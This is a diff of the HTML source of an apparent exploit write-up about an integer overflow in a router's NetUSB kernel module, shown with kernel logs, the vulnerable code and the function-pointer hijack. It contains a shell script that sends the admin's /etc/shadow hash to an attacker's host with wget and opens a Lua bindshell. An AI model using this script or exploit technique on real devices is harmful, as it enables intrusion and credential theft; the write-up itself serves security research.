+<span class="o">[</span><span class="w">   </span><span class="m">89</span>.268000<span class="o">]</span><span class="w"> </span>kc<span class="w">   </span><span class="m">90</span><span class="w"> </span>:<span class="w"> </span>run_telnetDBGDServer<span class="w"> </span>start
+<span class="o">[</span><span class="w">   </span><span class="m">89</span>.272000<span class="o">]</span><span class="w"> </span>kc<span class="w">  </span><span class="m">227</span><span class="w"> </span>:<span class="w"> </span>init_DebugD<span class="w"> </span>end
+<span class="o">[</span><span class="w">   </span><span class="m">89</span>.272000<span class="o">]</span><span class="w"> </span>INFO17F8:<span class="w"> </span>NetUSB<span class="w"> </span><span class="m">1</span>.02.69,<span class="w"> </span><span class="m">00030308</span><span class="w"> </span>:<span class="w"> </span>Jun<span class="w"> </span><span class="m">11</span><span class="w"> </span><span class="m">2015</span><span class="w"> </span><span class="m">18</span>:15:00
+<span class="o">[</span><span class="w">   </span><span class="m">89</span>.272000<span class="o">]</span><span class="w"> </span>INFO17FA:<span class="w"> </span><span class="m">7437</span>:<span class="w"> </span>Archer<span class="w"> </span>C7<span class="w">    </span>:Archer<span class="w"> </span>C7
+<span class="o">[</span><span class="w">   </span><span class="m">89</span>.272000<span class="o">]</span><span class="w"> </span>INFO17FB:<span class="w">  </span>AUTH<span class="w"> </span>ISOC
+<span class="o">[</span><span class="w">   </span><span class="m">89</span>.272000<span class="o">]</span><span class="w"> </span>INFO17FC:<span class="w">  </span>filterAudio
+<span class="o">[</span><span class="w">   </span><span class="m">89</span>.272000<span class="o">]</span><span class="w"> </span>usbcore:<span class="w"> </span>registered<span class="w"> </span>new<span class="w"> </span>interface<span class="w"> </span>driver<span class="w"> </span>KC<span class="w"> </span>NetUSB<span class="w"> </span>General<span class="w"> </span>Driver
+<span class="o">[</span><span class="w">   </span><span class="m">89</span>.276000<span class="o">]</span><span class="w"> </span>INFO0145:<span class="w">  </span>init<span class="w"> </span>proc<span class="w"> </span>:<span class="w"> </span>PAGE_SIZE<span class="w"> </span><span class="m">4096</span>
+<span class="o">[</span><span class="w">   </span><span class="m">89</span>.280000<span class="o">]</span><span class="w"> </span>INFO16EC:<span class="w">  </span>infomap<span class="w"> </span>869c6e38
+<span class="o">[</span><span class="w">   </span><span class="m">89</span>.280000<span class="o">]</span><span class="w"> </span>INFO16EF:<span class="w">  </span>sleep<span class="w"> </span>to<span class="w"> </span><span class="nb">wait</span><span class="w"> </span>eth0<span class="w"> </span>to<span class="w"> </span>wake<span class="w"> </span>up
+<span class="o">[</span><span class="w">   </span><span class="m">89</span>.280000<span class="o">]</span><span class="w"> </span>INFO15BF:<span class="w"> </span>tcpConnector<span class="o">()</span><span class="w"> </span>started...<span class="w"> </span>:<span class="w"> </span>eth0
+NetUSB<span class="w"> </span><span class="m">160207</span><span class="w"> </span><span class="m">0</span><span class="w"> </span>-<span class="w"> </span>Live<span class="w"> </span>0x869c0000<span class="w"> </span><span class="o">(</span>P<span class="o">)</span>
+GPL_NetUSB<span class="w"> </span><span class="m">3409</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>NetUSB,<span class="w"> </span>Live<span class="w"> </span>0x8694f000
+root@debian-mips:~#<span class="w"> </span><span class="o">[</span><span class="w">   </span><span class="m">92</span>.308000<span class="o">]</span><span class="w"> </span>INFO1572:<span class="w"> </span>Bind<span class="w"> </span>to<span class="w"> </span>eth0
 </code></pre></div>
 
 
@@ -423,19 +423,19 @@ root@debian-mips:~# <span class="o">[</span>   <span class="m">92</span>.308000<
 <p>Once I was able to attach GDB to the kernel I finally had an environment where I could get as much introspection as I needed. Note that because of all the modifications I had done to the kernel config, I didn't really know if it would be possible to port the exploit to the real target. But I also didn't have an exploit at the time, so I figured this would be another problem to solve later if I even get there.</p>
 <p>I started to read a lot of code, documentation and papers about Linux kernel exploitation. The linux kernel version was old enough that it didn't have a bunch of more recent mitigations. This gave me some hope. I spent quite a bit of time trying to exploit the overflow from above. In <a href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html">Exploiting the Linux kernel via packet sockets</a> <a href="https://twitter.com/andreyknvl">Andrey Konovalov</a> describes in details an attack that looked like could work for the bug I had found. Also, read the article as it is both well written and fascinating. The overall idea is that kmalloc internally uses the buddy allocator to get pages off the kernel and as a result, we might be able to place the buddy page that we can overflow right before pages used to store a kmalloc slab. If I remember correctly, my strategy was to drain the order 0 freelist (blocks of memory that are 0x1000 bytes) which would force blocks from the higher order to be broken down to feed the freelist. I imagined that a block from the order 1 freelist could be broken into 2 chunks of 0x1000 which would mean I could get a 0x1000 block adjacent to another 0x1000 block that could be now used by a kmalloc-1024 slab. I struggled and tried a lot of things and never managed to pull it off. I remember the bug had a few annoying things I hadn't realized when finding it, but I am sure a more experienced Linux kernel hacker could have written an exploit for this bug.</p>
 <p>I thought, oh well. Maybe there's something better. Maybe I should focus on looking for a similar bug but in a kmalloc'd region as I wouldn't have to deal with the same problems as above. I would still need to worry about being able to place the buffer adjacent to a juicy corruption target though. After looking around for a bit longer I found another integer overflow:</p>
-<div class="highlight"><pre><span></span><code><span class="kt">void</span> <span class="o">*</span><span class="nf">SoftwareBus_dispatchNormalEPMsgOut</span><span class="p">(</span><span class="n">SbusConnection_t</span> <span class="o">*</span><span class="n">SbusConnection</span><span class="p">,</span> <span class="kt">char</span> <span class="n">HostCommand</span><span class="p">,</span> <span class="kt">char</span> <span class="n">Opcode</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="nf">SoftwareBus_dispatchNormalEPMsgOut</span><span class="p">(</span><span class="n">SbusConnection_t</span><span class="w"> </span><span class="o">*</span><span class="n">SbusConnection</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">HostCommand</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">Opcode</span><span class="p">)</span>
 <span class="p">{</span>
-  <span class="c1">// ...</span>
-  <span class="k">switch</span> <span class="p">(</span><span class="n">OpcodeMasked</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">case</span> <span class="mh">0x50</span><span class="o">:</span>
-        <span class="k">if</span> <span class="p">(</span><span class="n">SoftwareBus_fillBuf</span><span class="p">(</span><span class="n">SbusConnection</span><span class="p">,</span> <span class="n">ReceiveBuffer</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="p">{</span>
-          <span class="n">ReceivedSize</span> <span class="o">=</span> <span class="n">_bswapw</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)</span><span class="n">ReceiveBuffer</span><span class="p">);</span>
-            <span class="n">AllocatedBuffer</span> <span class="o">=</span> <span class="n">_kmalloc</span><span class="p">(</span><span class="n">ReceivedSize</span> <span class="o">+</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">208</span><span class="p">);</span>
-            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">AllocatedBuffer</span><span class="p">)</span> <span class="p">{</span>
-                <span class="k">return</span> <span class="n">kc_printf</span><span class="p">(</span><span class="s">&quot;INFO%04X: Out of memory in USBSoftwareBus&quot;</span><span class="p">,</span> <span class="mi">4296</span><span class="p">);</span>
-            <span class="p">}</span>
-  <span class="c1">// ...</span>
-            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">SoftwareBus_fillBuf</span><span class="p">(</span><span class="n">SbusConnection</span><span class="p">,</span> <span class="n">AllocatedBuffer</span> <span class="o">+</span> <span class="mi">16</span><span class="p">,</span> <span class="n">ReceivedSize</span><span class="p">))</span>
+<span class="w">  </span><span class="c1">// ...</span>
+<span class="w">  </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">OpcodeMasked</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="mh">0x50</span><span class="p">:</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">SoftwareBus_fillBuf</span><span class="p">(</span><span class="n">SbusConnection</span><span class="p">,</span><span class="w"> </span><span class="n">ReceiveBuffer</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">ReceivedSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_bswapw</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)</span><span class="n">ReceiveBuffer</span><span class="p">);</span>
+<span class="w">            </span><span class="n">AllocatedBuffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_kmalloc</span><span class="p">(</span><span class="n">ReceivedSize</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">17</span><span class="p">,</span><span class="w"> </span><span class="mi">208</span><span class="p">);</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">AllocatedBuffer</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">kc_printf</span><span class="p">(</span><span class="s">&quot;INFO%04X: Out of memory in USBSoftwareBus&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">4296</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">  </span><span class="c1">// ...</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">SoftwareBus_fillBuf</span><span class="p">(</span><span class="n">SbusConnection</span><span class="p">,</span><span class="w"> </span><span class="n">AllocatedBuffer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">16</span><span class="p">,</span><span class="w"> </span><span class="n">ReceivedSize</span><span class="p">))</span>
 </code></pre></div>
 
 
@@ -465,33 +465,33 @@ root@debian-mips:~# <span class="o">[</span>   <span class="m">92</span>.308000<
 
 
 <p>My final exploit, <a href="https://github.com/0vercl0k/zenith">Zenith</a>, overflows an adjacent <code>wait_queue_head_t.head.next</code> structure that is placed by the socket stack of the Linux kernel with the address of a crafted <code>wait_queue_entry_t</code> under my control (<code>Trasher</code> class in the exploit code). This is the definition of the structure:</p>
-<div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="n">wait_queue_head</span> <span class="p">{</span>
-  <span class="n">spinlock_t</span>    <span class="n">lock</span><span class="p">;</span>
-  <span class="k">struct</span> <span class="n">list_head</span>  <span class="n">head</span><span class="p">;</span>
+<div class="highlight"><pre><span></span><code><span class="k">struct</span><span class="w"> </span><span class="nc">wait_queue_head</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">spinlock_t</span><span class="w">    </span><span class="n">lock</span><span class="p">;</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">list_head</span><span class="w">  </span><span class="n">head</span><span class="p">;</span>
 <span class="p">};</span>
 
-<span class="k">struct</span> <span class="n">wait_queue_entry</span> <span class="p">{</span>
-  <span class="kt">unsigned</span> <span class="kt">int</span>    <span class="n">flags</span><span class="p">;</span>
-  <span class="kt">void</span>      <span class="o">*</span><span class="n">private</span><span class="p">;</span>
-  <span class="n">wait_queue_func_t</span> <span class="n">func</span><span class="p">;</span>
-  <span class="k">struct</span> <span class="n">list_head</span>  <span class="n">entry</span><span class="p">;</span>
+<span class="k">struct</span><span class="w"> </span><span class="nc">wait_queue_entry</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w">    </span><span class="n">flags</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">void</span><span class="w">      </span><span class="o">*</span><span class="n">private</span><span class="p">;</span>
+<span class="w">  </span><span class="n">wait_queue_func_t</span><span class="w"> </span><span class="n">func</span><span class="p">;</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">list_head</span><span class="w">  </span><span class="n">entry</span><span class="p">;</span>
 <span class="p">};</span>
 </code></pre></div>
 
 
 <p>This structure has a function pointer, <code>func</code>, that I use to hijack the execution and redirect the flow to a fixed location, in a large kernel heap chunk where I previously staged the payload (<code>0x83c00000</code> in the exploit code). The function invoking the <code>func</code> function pointer is <code>__wake_up_common</code> and you can see its code below:</p>
-<div class="highlight"><pre><span></span><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">__wake_up_common</span><span class="p">(</span><span class="n">wait_queue_head_t</span> <span class="o">*</span><span class="n">q</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">mode</span><span class="p">,</span>
-      <span class="kt">int</span> <span class="n">nr_exclusive</span><span class="p">,</span> <span class="kt">int</span> <span class="n">wake_flags</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">key</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">__wake_up_common</span><span class="p">(</span><span class="n">wait_queue_head_t</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">mode</span><span class="p">,</span>
+<span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="n">nr_exclusive</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">wake_flags</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">)</span>
 <span class="p">{</span>
-  <span class="n">wait_queue_t</span> <span class="o">*</span><span class="n">curr</span><span class="p">,</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
+<span class="w">  </span><span class="n">wait_queue_t</span><span class="w"> </span><span class="o">*</span><span class="n">curr</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">next</span><span class="p">;</span>
 
-  <span class="n">list_for_each_entry_safe</span><span class="p">(</span><span class="n">curr</span><span class="p">,</span> <span class="n">next</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">task_list</span><span class="p">,</span> <span class="n">task_list</span><span class="p">)</span> <span class="p">{</span>
-    <span class="kt">unsigned</span> <span class="n">flags</span> <span class="o">=</span> <span class="n">curr</span><span class="o">-&gt;</span><span class="n">flags</span><span class="p">;</span>
+<span class="w">  </span><span class="n">list_for_each_entry_safe</span><span class="p">(</span><span class="n">curr</span><span class="p">,</span><span class="w"> </span><span class="n">next</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">task_list</span><span class="p">,</span><span class="w"> </span><span class="n">task_list</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">flags</span><span class="p">;</span>
 
-    <span class="k">if</span> <span class="p">(</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">(</span><span class="n">curr</span><span class="p">,</span> <span class="n">mode</span><span class="p">,</span> <span class="n">wake_flags</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
-        <span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">WQ_FLAG_EXCLUSIVE</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!--</span><span class="n">nr_exclusive</span><span class="p">)</span>
-      <span class="k">break</span><span class="p">;</span>
-  <span class="p">}</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">(</span><span class="n">curr</span><span class="p">,</span><span class="w"> </span><span class="n">mode</span><span class="p">,</span><span class="w"> </span><span class="n">wake_flags</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span>
+<span class="w">        </span><span class="p">(</span><span class="n">flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">WQ_FLAG_EXCLUSIVE</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!--</span><span class="n">nr_exclusive</span><span class="p">)</span>
+<span class="w">      </span><span class="k">break</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
@@ -549,9 +549,9 @@ envp: .word 0
 
 <p>The <a href="https://github.com/0vercl0k/zenith/blob/main/src/pwn_base.sh">pwn.sh</a> shell script simply leaks the <code>admin</code>'s <code>shadow</code> hash, and opens a bindshell (cheers to <a href="https://twitter.com/swapgs">Thomas Chauchefoin</a> and <a href="https://twitter.com/0xMitsurugi">Kevin Denis</a> for the Lua oneliner) the attacker can connect to (if the kernel hasn't crashed yet 😳):</p>
 <div class="highlight"><pre><span></span><code><span class="ch">#!/bin/sh</span>
-<span class="nb">export</span> <span class="nv">LPORT</span><span class="o">=</span><span class="m">31337</span>
-wget http://<span class="o">{</span>ip_local<span class="o">}</span>:8000/pwd?<span class="k">$(</span>grep -E admin: /etc/shadow<span class="k">)</span>
-lua -e <span class="s1">&#39;local k=require(&quot;socket&quot;);</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">31337</span>
+wget<span class="w"> </span>http://<span class="o">{</span>ip_local<span class="o">}</span>:8000/pwd?<span class="k">$(</span>grep<span class="w"> </span>-E<span class="w"> </span>admin:<span class="w"> </span>/etc/shadow<span class="k">)</span>
+lua<span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;local k=require(&quot;socket&quot;);</span>
 <span class="s1">  local s=assert(k.bind(&quot;*&quot;,os.getenv(&quot;LPORT&quot;)));</span>
 <span class="s1">  local c=s:accept();</span>
 <span class="s1">  while true do</span>
